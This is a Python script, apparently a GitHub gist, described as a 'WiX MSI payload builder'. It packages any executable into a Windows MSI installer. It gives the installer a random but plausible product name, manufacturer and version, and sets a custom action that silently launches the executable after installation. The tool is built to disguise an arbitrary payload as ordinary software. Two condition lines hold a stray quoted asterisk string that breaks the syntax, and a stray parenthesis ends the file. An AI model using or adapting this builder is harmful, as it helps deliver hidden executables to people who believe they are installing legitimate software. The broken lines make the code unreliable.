#date: 2025-10-09T17:07:46Z
#url: https://api.github.com/gists/cfd5802531997c7d106870405f911062
#owner: https://api.github.com/users/totekuh

#!/usr/bin/env python3
import uuid
import shutil
import tempfile
import subprocess
from pathlib import Path
import string
import secrets
from typing import List
import random


def random_version(parts: int = 3) -> str:
    """
    Generate a random but valid MSI version string: e.g. '1.4.982', '10.3.0.17'
    parts: 3 or 4 (major.minor.build[.rev])
    """
    parts = max(2, min(parts, 4))
    nums = [str(random.randint(0, 50)) for _ in range(parts)]
    return ".".join(nums)

WORDS1 = [
    "Cloud","System","Net","Diag","Win","App","Core","Service","Data","Stream","Pulse","Echo","Node","Atlas","Vector",
    "Nimbus","Halo","Orbit","Axis","Matrix","Bridge","Gate","Flux","Quantum","Signal","Anchor",
    "Forge","Kernel","Shard","Slate","Prism","Horizon","Vertex","Sigma","Axis","Cache","Relay","Pulse","Field","Stream",
    "Vortex","Cluster","Aspect","Glyph","Lumen","Pulse","Quartz","Cobalt","Onyx","Argon","Nova","Helix","Cipher","Atlas",
    "Radiant","Marlin","Talon","Serris","Sentinel","Harbor","Canoe","Rivet","Pixel","Raster","Vector","Magma",
    "Drift","Falcon","Ridge","Summit","Bastion","Strata","Contour","Munit","Ledger","Pylon","Anchorite",
    "Compass","Cartel","Galley","Haven","Citadel","Tesser","Paragon","Mercury","Apollo","Orion","Lyra","Kodiak","Nomad",
    "Arcadia","Echelon","Mirage","Cinder","Grove","Boreal","Nimbus","Celest","Fathom","Corsair","Vanguard",
    "Helios","Atlasphere","Argus","Warden","Cachet","Fjord","Nebula","Cascade"
]

WORDS2 = [
    "Manager","Host","Helper","Agent","Updater","Module","Daemon","Agent","AgentX","Broker","Keeper","Watcher",
    "Guardian","Handler","Driver","Controller","Supervisor","Monitor","Proxy","Service","Runner","Launcher","AgentPro",
    "DaemonSvc","Orchestrator","Scheduler","Coordinator","Dispatcher","Operator","Admin","AgentCore","AgentHost",
    "Conductor","Executor","Invoker","Bridge","Adapter","Connector","Shim","ControllerX","Pilot","KeeperX","Observer",
    "Registrar","RegistrarSvc","Binder","RegistrarX","Anchorman","AnchorSvc","Custodian","Archivist","ArchivistSvc",
    "Mediator","Marshal","Sentinel","SentinelSvc","Gatekeeper","Pathfinder","Navigator","Scout","Surveyor","Warden",
    "Viceroy","Overseer","Steward","Caretaker","Curator","Shepherd","Harbinger","Catalyst","Engine","Assembler","Fabric",
    "Synth","Composer","Builder","Smith","Forge","Foundry","Smithery","Molder","Conflux","Mixer","Fluxer","Balancer",
    "Regulator","Optimizer","Tuner","Profiler","Inspector","Scanner","Analyzer","Indexer","Collector","Aggregator",
    "Harvester","Miner","Extractor","Fetcher","Retriever","Packer","Unpacker","Serializer","Deserializer",
    "Marshaller","Gateway","Endpoint","ServiceBus","Pipeline","Streamlet","Router","Switch","Mux","Demux","Distributor",
    "BalancerX","BalancerSvc","RelaySvc"
]

# Optional suffixes/prefixes to add some variety (keeps things "plausible")
SUFFIXES = ["Svc","Core","Pro","SvcX","Agent","Mgr","Host","Daemon","SvcPro","Net"]
PREFIXES = ["Sys","Win","Micro","Neo","Ultra","Hyper","Meta","Proto","Secure","True"]


def _pick(seq: List[str]) -> str:
    return secrets.choice(seq)

def generate_name(parts: int = 2,
                  joiner: str = "",
                  use_prefix: bool = True,
                  use_suffix: bool = True,
                  camel_case: bool = True) -> str:
    """
    Generate a single name.

    parts: number of words to stitch (2 is default — like WORD1 + WORD2)
    joiner: string to place between parts ('' yields concatenation)
    use_prefix/suffix: randomly attach a prefix/suffix sometimes
    camel_case: capitalize each part (True) or return raw concat (False)
    """
    parts_list = []
    # alternate pick from WORDS1 and WORDS2 if possible, otherwise random choice
    for i in range(parts):
        if i % 2 == 0:
            w = _pick(WORDS1)
        else:
            w = _pick(WORDS2)
        parts_list.append(w)

    # optional prefix/suffix with small probability
    if use_prefix and secrets.randbelow(100) < 25: "**********"
        parts_list.insert(0, _pick(PREFIXES))

    if use_suffix and secrets.randbelow(100) < 30: "**********"
        parts_list.append(_pick(SUFFIXES))

    if camel_case:
        parts_list = [p[0].upper() + p[1:] if p else p for p in parts_list]

    name = joiner.join(parts_list)
    # sanitize to allowed ID characters (letters, digits, underscore)
    allowed = string.ascii_letters + string.digits + "_"
    sanitized = ''.join(ch if ch in allowed else '_' for ch in name)
    # ensure it doesn't start with digit for XML Id safety
    if sanitized and sanitized[0] in string.digits:
        sanitized = "A" + sanitized
    return sanitized

def run(cmd, **kwargs):
    print(f"> {' '.join(cmd)}")
    subprocess.run(cmd, check=True, **kwargs)

def get_wxs_file_content(exe_name: str) -> str:
    # Template XML as a string
    template_xml = """<?xml version="1.0" encoding="UTF-8"?>
    <Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
      <Product Name="{{product_name}}" Id="*"
               UpgradeCode="{{product_guid}}"
               Version="{{version}}" Manufacturer="{{manufacturer}}" Language="1033">
        <Package InstallerVersion="200" Compressed="yes" />
        <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>

        <Directory Id="TARGETDIR" Name="SourceDir">
          <Directory Id="ProgramFilesFolder">
            <Directory Id="INSTALLFOLDER" Name="HelloWorld"/>
          </Directory>
        </Directory>

        <Component Id="{{component_id}}" Guid="{{component_guid}}" Directory="INSTALLFOLDER">
          <File Id="{{file_id}}" Source="{{exe_name}}" KeyPath="yes" />
        </Component>

        <Feature Id="DefaultFeature" Title="{{feature_title}}" Level="1">
          <ComponentRef Id="{{component_id}}"/>
        </Feature>

        <!-- Custom action: run the executable file after install -->
        <CustomAction Id="{{action_name}}"
                      FileKey="{{file_id}}"
                      ExeCommand=""
                      Return="asyncNoWait"/>

        <InstallExecuteSequence>
          <Custom Action="{{action_name}}" After="InstallFinalize">1</Custom>
        </InstallExecuteSequence>
      </Product>
    </Wix>
    """
    # generate GUIDs
    product_guid = str(uuid.uuid4())
    component_guid = str(uuid.uuid4())
    action_name = generate_name()
    feature_title = generate_name()
    product_name = generate_name()
    component_id = generate_name()
    file_id = generate_name()
    manufacturer = generate_name()
    version = random_version(parts=4)


    print(f"[*] Using product GUID: {product_guid}")
    print(f"[*] Using component GUID: {component_guid}")
    print(f"[*] Using generated action name: {action_name}")
    print(f"[*] Using generated feature title: {feature_title}")
    print(f"[*] Using generated product name: {product_name}")
    print(f"[*] Using generated component id: {component_id}")
    print(f"[*] Using generated file id: {file_id}")
    print(f"[*] Using generated manufacturer: {manufacturer}")
    print(f"[*] Using generated version: {version}")

    print(f"[*] Using EXE name: {exe_name}")

    # perform replacements -> sample.wxs
    text = template_xml
    text = text.replace("{{product_guid}}", product_guid)
    text = text.replace("{{component_guid}}", component_guid)
    text = text.replace("{{action_name}}", action_name)
    text = text.replace("{{feature_title}}", feature_title)
    text = text.replace("{{product_name}}", product_name)
    text = text.replace("{{component_id}}", component_id)
    text = text.replace("{{file_id}}", file_id)
    text = text.replace("{{manufacturer}}", manufacturer)
    text = text.replace("{{version}}", version)

    text = text.replace("{{exe_name}}", exe_name)
    return text


def get_arguments():
    from argparse import ArgumentParser
    parser = ArgumentParser(description="WiX MSI payload builder")
    parser.add_argument("-e",
                        "--exe",
                        required=True,
                        help="Path to the EXE file to include")

    parser.add_argument("-o",
                        "--output",
                        default="sample.msi",
                        help="Output MSI filename")
    return parser.parse_args()


def main():
    options = get_arguments()

    exe_path = Path(options.exe).resolve()
    output_path = options.output
    if not exe_path.is_file():
        raise SystemExit(f"Executable not found: {exe_path}")

    with tempfile.TemporaryDirectory(prefix="wixbuild_") as tmpdir:
        tmp = Path(tmpdir)
        shutil.copy2(exe_path, tmp / exe_path.name)

        xml = get_wxs_file_content(exe_name=exe_path.name)

        wxs = tmp / "sample.wxs"
        wxs.write_text(xml, encoding="utf-8")

        # run WiX in docker
        run(["docker", "run", "--rm", "-v", f"{tmp}:/wix", "dactiv/wix", "candle", "sample.wxs"])
        run(["docker", "run", "--rm", "-v", f"{tmp}:/wix", "dactiv/wix", "light", "sample.wixobj", "-sval"])

        # copy result out
        built = tmp / "sample.msi"
        if built.exists():
            shutil.copy2(built, Path.cwd() / output_path)
            print(f"[+] Built MSI: {output_path}")
        else:
            print(f"[-] build failed; {output_path} not found")

if __name__ == "__main__":
    main()
)
